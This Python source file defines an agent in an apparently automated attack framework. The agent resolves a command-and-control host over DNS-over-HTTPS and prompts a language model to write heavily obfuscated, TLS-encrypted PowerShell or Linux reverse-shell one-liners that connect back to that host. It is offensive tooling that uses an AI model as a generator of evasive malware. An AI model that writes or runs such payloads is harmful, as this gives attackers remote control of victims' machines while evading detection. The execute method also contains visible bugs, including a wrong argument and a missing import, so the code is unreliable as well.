from core.data_models import Strategy, PayloadGeneratorReport, ErrorType
from core.data_models import AgentData, Strategy
from core.logger import log
from core.doh_utils import resolve_doh

from core.base_agent import BaseAgent


class PayloadGeneratorAgent(BaseAgent):
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.report_class = PayloadGeneratorReport

    async def run(self, strategy: Strategy, **kwargs) -> PayloadGeneratorReport:
        os_type = strategy.context.get("os_type")
        c2_host = strategy.context.get("c2_host")
        c2_port = strategy.context.get("c2_port")
        user_agent = strategy.context.get("user_agent")

        if not all([os_type, c2_host, c2_port, user_agent]):
            return self.create_report(
                errors=["Missing one or more required parameters: os_type, c2_host, c2_port, user_agent."],
                error_type=ErrorType.CONFIGURATION,
                summary="Payload generation failed: Missing required parameters."
            )

        log.info(
            f"Generating dynamic payload for {os_type} targeting {c2_host}:{c2_port}")

        c2_ip = resolve_doh(c2_host)
        if not c2_ip:
            log.error(f"Could not resolve C2 host {c2_host} via DoH.")
            return self.create_report(
                errors=[f"Could not resolve C2 host {c2_host} via DoH."],
                error_type=ErrorType.NETWORK,
                summary="Payload generation failed: C2 host resolution failed."
            )
        log.info(f"Resolved C2 host {c2_host} to {c2_ip} via DoH.")

        prompt = self._build_prompt(os_type, c2_ip, c2_port, user_agent)

        try:
            response = await self.orchestrator.call_llm_func(prompt, context="PayloadGeneratorAgent")
            payload = response.get("payload")
            if payload:
                log.success("Successfully generated dynamic payload.")
                return self.create_report(payload=payload, summary="Successfully generated dynamic payload.")
            else:
                log.error("LLM did not return a payload.")
                return self.create_report(
                    errors=["LLM did not return a payload."],
                    error_type=ErrorType.LOGIC,
                    summary="Payload generation failed: LLM did not return a payload."
                )
        except Exception as e:
            log.error(f"Error generating payload: {e}")
            return self.create_report(
                errors=[f"Error generating payload: {e}"],
                error_type=ErrorType.LOGIC,
                summary=f"Payload generation failed due to an unexpected error: {e}"
            )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute payload generator agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _build_prompt(self, os_type: str, c2_host: str, c2_port: int, user_agent: str) -> str:
        if os_type.lower() == 'windows':
            return f"""
            Create a PowerShell one-liner reverse shell that connects to {c2_host} on port {c2_port}.
            The connection MUST be TLS-encrypted.
            The payload MUST be heavily obfuscated using techniques like string concatenation, base64 encoding, and variable renaming.
            Any web requests made by the payload (e.g., for DoH resolution) MUST use the User-Agent: '{user_agent}'.
            The final output should be a single line of PowerShell code.
            Return ONLY the payload in a JSON object with the key "payload".
            """
        else:  # Linux
            return f"""
            Create a Linux one-liner reverse shell that connects to {c2_host} on port {c2_port}.
            The connection MUST be TLS-encrypted using openssl.
            The payload MUST be heavily obfuscated. Use techniques like creating a named pipe, using base64 encoding for commands, and string concatenation.
            Any web requests made by the payload (e.g., for DoH resolution) MUST use the User-Agent: '{user_agent}'.
            The final output should be a single line of shell script.
            Return ONLY the payload in a JSON object with the key "payload".
            """
